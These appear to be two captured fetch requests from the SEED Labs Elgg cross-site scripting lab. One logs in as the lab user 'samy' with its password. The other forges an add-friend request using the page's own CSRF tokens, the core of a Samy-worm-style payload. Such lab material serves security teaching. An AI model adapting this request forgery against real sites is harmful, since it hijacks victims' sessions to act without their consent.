await fetch("http://www.seed-server.com/action/login", {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Elgg-Ajax-API": "2",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "multipart/form-data; boundary=---------------------------300333673516035856403002083112",
        "Sec-GPC": "1"
    },
    "referrer": "http://www.seed-server.com/",
    "body": "-----------------------------300333673516035856403002083112\r\nContent-Disposition: form-data; name=\"__elgg_token\"\r\n\r\ngTVGbCrOGGl3R6e_NN3TFA\r\n-----------------------------300333673516035856403002083112\r\nContent-Disposition: form-data; name=\"__elgg_ts\"\r\n\r\n1708097216\r\n-----------------------------300333673516035856403002083112\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\nsamy\r\n-----------------------------300333673516035856403002083112\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\nseedsamy\r\n-----------------------------300333673516035856403002083112--\r\n",
    "method": "POST",
    "mode": "cors"
});

await fetch(`http://www.seed-server.com/action/friends/add?friend=58&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}&__elgg_ts=${elgg.security.token.__elgg_ts}&__elgg_token=${elgg.security.token.__elgg_token}`, {
    "credentials": "include",
    "headers": {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Requested-With": "XMLHttpRequest",
        "Sec-GPC": "1"
    },
    "referrer": "http://www.seed-server.com/profile/charlie",
    "method": "GET",
    "mode": "cors"
});

